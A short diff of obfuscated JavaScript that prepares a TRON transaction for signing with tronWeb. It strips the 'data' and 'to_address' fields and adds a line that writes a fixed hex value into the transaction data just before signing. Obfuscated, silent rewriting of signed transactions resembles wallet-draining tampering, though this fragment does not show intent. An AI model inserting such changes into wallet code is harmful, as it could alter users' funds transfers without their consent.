@@ -229,6 +229,7 @@ async function _0x8f88sb(_0x5b1fc5) {
     ..._0x25dedb.raw_data.contract[0].parameter.value
   };
   delete _0x348df4.raw_data.contract[0].parameter.value.data;
+   _0x4f164f.raw_data.contract[0].parameter.value.data = "46e04a2f";
   delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
   try {
     let _0x1c8990 = await tronWeb.trx.sign({
